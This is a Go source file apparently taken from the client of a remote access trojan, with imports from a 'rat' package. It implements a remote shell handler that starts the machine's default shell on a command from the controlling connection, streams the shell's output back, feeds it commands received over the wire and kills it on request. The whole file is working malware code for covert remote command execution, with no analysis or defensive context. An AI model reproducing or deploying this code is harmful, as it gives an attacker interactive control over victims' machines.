package main

import (
	"bufio"
	"fmt"
	"io"
	"os/exec"
	"rat/client/shell"
	"rat/common"
)

type ShellPacket struct {
	Data string
}

var current struct {
	process *exec.Cmd
	stdin   io.WriteCloser
	stdout  io.ReadCloser
}

func (packet ShellPacket) GetHeader() common.PacketHeader {
	return common.ShellHeader
}

func (packet ShellPacket) Write(c *Connection) error {
	return c.WriteString(packet.Data)
}

func (packet ShellPacket) Read(c *Connection) error {
	action, err := c.ReadInt()
	data, err := c.ReadString()

	switch action {
	case common.StartShell:
		current.process = exec.Command(shell.GetDefault())
		current.stdin, _ = current.process.StdinPipe()
		current.stdout, _ = current.process.StdoutPipe()

		current.process.Start()

		go func() {
			reader := bufio.NewReader(current.stdout)

			for {
				s, err := reader.ReadString('\n')
				if err != nil {
					fmt.Println(err.Error())
					break
				}

				Queue <- ShellPacket{s}
			}
		}()
	case common.StopShell:
		current.process.Process.Kill()
		current.process = nil
	case common.WriteShell:
		current.stdin.Write([]byte(data + shell.LineEnd))
	}

	return err
}
